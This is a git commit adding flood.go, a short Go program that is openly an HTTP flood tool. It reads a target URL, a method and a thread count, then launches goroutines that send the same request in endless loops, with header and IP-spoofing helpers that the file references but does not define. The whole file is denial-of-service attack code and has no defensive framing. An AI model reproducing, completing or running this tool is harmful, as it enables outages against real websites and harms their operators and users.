1e824799e88636969a3e94f146a932df2ceb9779
NgThanhVinh <117195555+Vntvxyz@users.noreply.github.com>
2023-02-04 14:30:49 +0700

    Create flood.go

---
+++ flood.go
@@ -0,0 +1,43 @@
+package main
+
+import(
+  "crypto/tls"
+  "log"
+  "os"
+  "strconv"
+
+  "github.com/valyala/fasthttp"
+)
+
+var target struct{
+  url string
+  threads int
+  method string
+  a_type string
+}
+
+func httpflood(){
+  head := header{"false", nil}
+  sp := spoof{"127.0.0.1", 5}
+  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
+  req := fasthttp.AcquireRequest()
+  req.SetRequestURI(target.url)
+  req.Header.SetMethod(target.method)
+  head.headers(req)
+  sp.spoofS(req)
+  for{
+    client.Do(req, nil)
+  }
+}
+
+func main(){
+  target.url = os.Args[1]
+  target.method = os.Args[2]
+  threads, _ := strconv.Atoi(os.Args[3])
+  log.Print("Bắt Đầu...")
+  for i:=0; i < threads; i++{
+    go httpflood()
+  }
+
+  <- make(chan bool, 1)
+}
